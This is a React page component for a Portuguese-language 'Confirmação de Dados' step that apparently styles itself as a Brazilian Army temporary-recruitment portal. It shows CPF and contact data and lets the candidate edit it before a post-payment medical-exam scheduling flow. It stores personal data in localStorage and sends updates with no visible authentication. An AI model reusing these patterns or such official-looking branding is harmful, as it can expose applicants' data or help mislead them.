import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, Edit3, MapPin, Clock, Calendar, User, Mail, Phone, FileText, Save, X, AlertTriangle, Stethoscope } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { useToast } from '@/hooks/use-toast';

export default function ConfirmacaoDadosPage() {
  const [, setLocation] = useLocation();
  const [userData, setUserData] = useState<any>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isEditing, setIsEditing] = useState(false);
  const [editData, setEditData] = useState<any>({});
  const [isSaving, setIsSaving] = useState(false);
  const [emailSuggestions, setEmailSuggestions] = useState<string[]>([]);
  const [showEmailSuggestions, setShowEmailSuggestions] = useState(false);
  const emailSuggestionsRef = useRef<HTMLDivElement>(null);
  const { trackEvent } = useClarityEvents();
  const { toast } = useToast();
  const queryClient = useQueryClient();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Buscar dados do usuário do localStorage
    const userDataFromStorage = localStorage.getItem('userMedicalLogin') || localStorage.getItem('currentUser');
    
    if (userDataFromStorage) {
      const parsedData = JSON.parse(userDataFromStorage);
      setUserData(parsedData);
      
      trackEvent('confirmacao_dados_accessed', {
        page: 'confirmacao_dados',
        timestamp: new Date().toISOString(),
        candidate_id: parsedData.id || 'unknown'
      });
    } else {
      // Se não há dados, redirecionar para login
      setLocation('/login-pos-pagamento');
    }
  }, []);

  // Click outside handler for email suggestions
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (emailSuggestionsRef.current && !emailSuggestionsRef.current.contains(event.target as Node)) {
        setShowEmailSuggestions(false);
      }
    };

    if (showEmailSuggestions) {
      document.addEventListener('mousedown', handleClickOutside);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [showEmailSuggestions]);

  // Mutation for updating candidate data
  const updateCandidateMutation = useMutation({
    mutationFn: async (updateData: any) => {
      const response = await fetch(`/api/candidate/${userData.id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(updateData),
      });

      if (!response.ok) {
        throw new Error('Erro ao atualizar dados');
      }

      return response.json();
    },
    onSuccess: (data) => {
      setUserData((prev: any) => ({ ...prev, ...data.data }));
      setIsEditing(false);
      setIsSaving(false);
      toast({
        title: "Dados atualizados",
        description: "Suas informações foram salvas com sucesso.",
      });

      // Update localStorage as well
      const currentUserData = localStorage.getItem('userMedicalLogin') || localStorage.getItem('currentUser');
      if (currentUserData) {
        const parsedData = JSON.parse(currentUserData);
        const updatedData = { ...parsedData, ...data.data };
        localStorage.setItem('userMedicalLogin', JSON.stringify(updatedData));
        localStorage.setItem('currentUser', JSON.stringify(updatedData));
      }
    },
    onError: (error) => {
      console.error('Error updating candidate:', error);
      setIsSaving(false);
      toast({
        title: "Erro ao salvar",
        description: "Não foi possível atualizar os dados. Tente novamente.",
        variant: "destructive",
      });
    }
  });

  const handleEdit = () => {
    setEditData({
      name: userData.name || '',
      email: userData.email || '',
      phone: userData.phone || '',
      birthDate: userData.birthDate ? new Date(userData.birthDate).toISOString().split('T')[0] : '',
      gender: userData.gender || ''
    });
    setIsEditing(true);
    
    trackEvent('editar_dados_clicked', {
      page: 'confirmacao_dados',
      timestamp: new Date().toISOString()
    });
  };

  const handleSave = async () => {
    setIsSaving(true);
    
    trackEvent('salvar_dados_clicked', {
      page: 'confirmacao_dados',
      timestamp: new Date().toISOString()
    });

    updateCandidateMutation.mutate(editData);
  };

  const handleCancel = () => {
    setIsEditing(false);
    setEditData({});
    setShowEmailSuggestions(false);
  };

  // Phone mask function
  const formatPhoneInput = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const match = cleaned.match(/^(\d{0,2})(\d{0,5})(\d{0,4})$/);
    if (!match) return value;
    
    let formatted = '';
    if (match[1]) formatted += `(${match[1]}`;
    if (match[2]) formatted += `) ${match[2]}`;
    if (match[3]) formatted += `-${match[3]}`;
    
    return formatted;
  };

  // Email autocomplete function
  const handleEmailChange = (value: string) => {
    setEditData((prev: any) => ({ ...prev, email: value }));
    
    if (value.includes('@') && !value.includes('@.')) {
      const [localPart, domainPart = ''] = value.split('@');
      const commonDomains = [
        'gmail.com',
        'hotmail.com', 
        'outlook.com',
        'yahoo.com.br',
        'terra.com.br',
        'uol.com.br',
        'ig.com.br',
        'bol.com.br',
        'live.com',
        'icloud.com'
      ];
      
      const suggestions = commonDomains
        .filter(domain => domain.startsWith(domainPart.toLowerCase()))
        .map(domain => `${localPart}@${domain}`)
        .slice(0, 5);
      
      setEmailSuggestions(suggestions);
      setShowEmailSuggestions(suggestions.length > 0 && domainPart.length > 0);
    } else {
      setShowEmailSuggestions(false);
    }
  };

  const handleEmailSuggestionClick = (suggestion: string) => {
    setEditData((prev: any) => ({ ...prev, email: suggestion }));
    setShowEmailSuggestions(false);
  };

  const handleConfirm = async () => {
    setIsConfirming(true);
    
    trackEvent('dados_confirmados', {
      page: 'confirmacao_dados',
      timestamp: new Date().toISOString(),
      candidate_id: userData?.id || 'unknown'
    });
    
    // Aguardar um pouco para feedback visual
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Redirecionar para agendamento médico
    setLocation('/agendamento-medico');
  };



  const formatCpf = (cpf: string) => {
    if (!cpf) return '';
    const cleanCpf = cpf.replace(/\D/g, '');
    return cleanCpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatPhone = (phone: string) => {
    if (!phone) return '';
    const cleanPhone = phone.replace(/\D/g, '');
    if (cleanPhone.length === 11) {
      return cleanPhone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    }
    return phone;
  };

  if (!userData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900 mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando dados...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Portais</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Militar Temporário</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Confirmação de Dados</span>
        </nav>

        {/* EMCM Alert */}
        <div className="mb-8">
          <Card className="border-l-4 border-[#fff9e9] bg-[#fff9e9]">
            <CardContent className="p-4">
              <div className="flex items-center space-x-3">
                <AlertTriangle className="w-6 h-6 text-gray-600 flex-shrink-0" />
                <div className="flex-1">
                  <h3 className="font-bold text-gray-900 mb-2">
                    Exame médico de competência mínima
                  </h3>
                  <div className="text-sm text-gray-700 space-y-2">
                    <p>
                      <strong>Obrigatório para participar da prova:</strong> Este exame não é um teste físico, mas sim uma avaliação médica que comprova a aptidão mínima para o serviço militar. É obrigatório realizar o agendamento em uma unidade médica do SUS ou do FUSEX próxima à sua residência.
                    </p>
                    <p className="bg-[#fff9e9] p-2 rounded text-gray-800 font-medium border border-gray-200">
                      O laudo deve ser apresentado no dia da prova, sob pena de desclassificação.
                    </p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            Confirmação de Dados
          </h1>
          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            Verifique se todas as informações estão corretas antes de prosseguir para o agendamento do exame médico.
          </p>
          
          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#6a7d00', backgroundColor: '#f7f8f0' }}>
            <p className="text-sm font-medium" style={{ color: '#6a7d00' }}>
              <strong>Importante:</strong> Certifique-se de que todos os dados estão corretos, pois serão utilizados no processo seletivo
            </p>
          </div>
        </header>

        {/* Dados Pessoais */}
        <section className="mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                  <User className="w-5 h-5 mr-2 text-gray-600" />
                  Dados Pessoais
                </h2>
                {!isEditing ? (
                  <Button 
                    variant="outline" 
                    size="sm" 
                    onClick={handleEdit}
                    className="flex items-center"
                  >
                    <Edit3 className="w-4 h-4 mr-1" />
                    Editar
                  </Button>
                ) : (
                  <div className="flex gap-2">
                    <Button 
                      variant="outline" 
                      size="sm" 
                      onClick={handleCancel}
                      disabled={isSaving}
                      className="flex items-center"
                    >
                      <X className="w-4 h-4 mr-1" />
                      Cancelar
                    </Button>
                    <Button 
                      size="sm" 
                      onClick={handleSave}
                      disabled={isSaving}
                      className="flex items-center bg-green-600 hover:bg-green-700"
                    >
                      {isSaving ? (
                        <>
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-1"></div>
                          Salvando...
                        </>
                      ) : (
                        <>
                          <Save className="w-4 h-4 mr-1" />
                          Salvar
                        </>
                      )}
                    </Button>
                  </div>
                )}
              </div>
              
              {!isEditing ? (
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-1">Nome Completo</label>
                    <p className="text-gray-900 font-medium">{userData.name || 'Não informado'}</p>
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-1">CPF</label>
                    <p className="text-gray-900 font-medium">{formatCpf(userData.cpf) || 'Não informado'}</p>
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-1">Email</label>
                    <p className="text-gray-900 font-medium flex items-center">
                      <Mail className="w-4 h-4 mr-1 text-gray-500" />
                      {userData.email || 'Não informado'}
                    </p>
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-1">Telefone</label>
                    <p className="text-gray-900 font-medium flex items-center">
                      <Phone className="w-4 h-4 mr-1 text-gray-500" />
                      {formatPhone(userData.phone) || 'Não informado'}
                    </p>
                  </div>
                  
                  {userData.birthDate && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Data de Nascimento</label>
                      <p className="text-gray-900 font-medium flex items-center">
                        <Calendar className="w-4 h-4 mr-1 text-gray-500" />
                        {new Date(userData.birthDate).toLocaleDateString('pt-BR')}
                      </p>
                    </div>
                  )}
                  
                  {userData.gender && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Sexo</label>
                      <p className="text-gray-900 font-medium">{userData.gender === 'M' ? 'Masculino' : 'Feminino'}</p>
                    </div>
                  )}
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-2">Nome Completo</label>
                    <Input
                      value={editData.name || ''}
                      onChange={(e) => setEditData(prev => ({ ...prev, name: e.target.value }))}
                      placeholder="Digite seu nome completo"
                      disabled={isSaving}
                      className="w-full"
                    />
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-2">CPF</label>
                    <div className="p-3 rounded-lg bg-gray-100 text-gray-600 border">
                      {formatCpf(userData.cpf)}
                      <span className="text-xs text-gray-500 block mt-1">
                        CPF não pode ser alterado
                      </span>
                    </div>
                  </div>
                  
                  <div className="relative">
                    <label className="text-sm font-medium text-gray-700 block mb-2">Email</label>
                    <Input
                      type="email"
                      value={editData.email || ''}
                      onChange={(e) => handleEmailChange(e.target.value)}
                      placeholder="Digite seu e-mail"
                      disabled={isSaving}
                      className="w-full"
                    />
                    {showEmailSuggestions && emailSuggestions.length > 0 && (
                      <div 
                        ref={emailSuggestionsRef}
                        className="absolute top-full left-0 right-0 bg-white border border-gray-300 rounded-lg shadow-lg z-10 mt-1"
                      >
                        {emailSuggestions.map((suggestion, index) => (
                          <button
                            key={index}
                            type="button"
                            onClick={() => handleEmailSuggestionClick(suggestion)}
                            className="w-full text-left px-3 py-2 hover:bg-gray-50 first:rounded-t-lg last:rounded-b-lg border-b border-gray-100 last:border-b-0"
                          >
                            {suggestion}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-2">Telefone</label>
                    <Input
                      value={formatPhoneInput(editData.phone || '')}
                      onChange={(e) => {
                        const rawValue = e.target.value.replace(/\D/g, '');
                        setEditData((prev: any) => ({ ...prev, phone: rawValue }));
                      }}
                      placeholder="(11) 99999-9999"
                      disabled={isSaving}
                      className="w-full"
                      maxLength={15}
                    />
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-2">Data de Nascimento</label>
                    <Input
                      type="date"
                      value={editData.birthDate || ''}
                      onChange={(e) => setEditData(prev => ({ ...prev, birthDate: e.target.value }))}
                      disabled={isSaving}
                      className="w-full"
                    />
                  </div>
                  
                  <div>
                    <label className="text-sm font-medium text-gray-700 block mb-2">Sexo</label>
                    <div className="p-3 rounded-lg bg-gray-100 text-gray-600 border">
                      {userData.gender === 'M' ? 'Masculino' : userData.gender === 'F' ? 'Feminino' : 'Não informado'}
                      <span className="text-xs text-gray-500 block mt-1">
                        Sexo não pode ser alterado
                      </span>
                    </div>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </section>

        {/* Dados da Vaga e Local de Prova */}
        {(userData.jobPosition || userData.examLocation) && (
          <section className="mb-8">
            <Card>
              <CardContent className="p-6">
                <h2 className="text-xl font-semibold text-gray-900 flex items-center mb-6">
                  <FileText className="w-5 h-5 mr-2 text-gray-600" />
                  Dados do Processo Seletivo
                </h2>
                
                <div className="grid md:grid-cols-2 gap-6">
                  {userData.jobPosition && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Cargo/Especialidade</label>
                      <p className="text-gray-900 font-medium">{userData.additionalData.applicationData.positionTitle || 'Não informado'}</p>
                      {userData.jobPosition.region && (
                        <p className="text-sm text-gray-600">{userData.jobPosition.region}</p>
                      )}
                    </div>
                  )}
                  
                  {userData.examLocation && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Local de Prova</label>
                      <p className="text-gray-900 font-medium flex items-start">
                        <MapPin className="w-4 h-4 mr-1 text-gray-500 mt-0.5 flex-shrink-0" />
                        <span>
                          {userData.examLocation.name || 'Não informado'}
                          {userData.examLocation.address && (
                            <span className="block text-sm text-gray-600 mt-1">
                              {userData.examLocation.address}
                            </span>
                          )}
                        </span>
                      </p>
                    </div>
                  )}
                  
                  {userData.examSchedule && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Data e Horário da Prova</label>
                      <p className="text-gray-900 font-medium flex items-center">
                        <Clock className="w-4 h-4 mr-1 text-gray-500" />
                        {userData.examSchedule.date} às {userData.examSchedule.time}
                      </p>
                    </div>
                  )}
                  
                  {userData.protocolId && (
                    <div>
                      <label className="text-sm font-medium text-gray-700 block mb-1">Protocolo</label>
                      <p className="text-gray-900 font-medium font-mono text-sm">
                        {userData.protocolId}
                      </p>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          </section>
        )}

        {/* Próximos Passos */}
        <section className="mb-8">
          <Card>
            <CardContent className="p-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-4">
                Próximos Passos
              </h2>
              
              <div className="space-y-3">
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-sm font-semibold mr-3">
                    1
                  </div>
                  <span className="text-gray-700">Confirmar dados pessoais e do processo seletivo</span>
                  <CheckCircle className="w-5 h-5 text-green-600 ml-2" />
                </div>
                
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center text-sm font-semibold mr-3">
                    2
                  </div>
                  <span className="text-gray-700">Agendar Exame Médico de Competência Mínima (EMCM)</span>
                </div>
                
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-gray-100 text-gray-600 rounded-full flex items-center justify-center text-sm font-semibold mr-3">
                    3
                  </div>
                  <span className="text-gray-700">Realizar exame médico na data agendada</span>
                </div>
                
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-gray-100 text-gray-600 rounded-full flex items-center justify-center text-sm font-semibold mr-3">
                    4
                  </div>
                  <span className="text-gray-700">Comparecer à prova na data e horário informados</span>
                </div>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Botão de Confirmação */}
        <div className="text-center">
          <Button
            onClick={handleConfirm}
            disabled={isConfirming}
            className="px-8 py-3 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg shadow-sm transition-all duration-200"
          >
            {isConfirming ? (
              <div className="flex items-center">
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                Confirmando...
              </div>
            ) : (
              'Confirmar Dados e Agendar Exame Médico'
            )}
          </Button>
          
          <p className="text-sm text-gray-600 mt-3">
            Ao confirmar, você será direcionado para o agendamento do exame médico
          </p>
        </div>
      </main>

      <ExercitoFooter />
    </div>
  );
}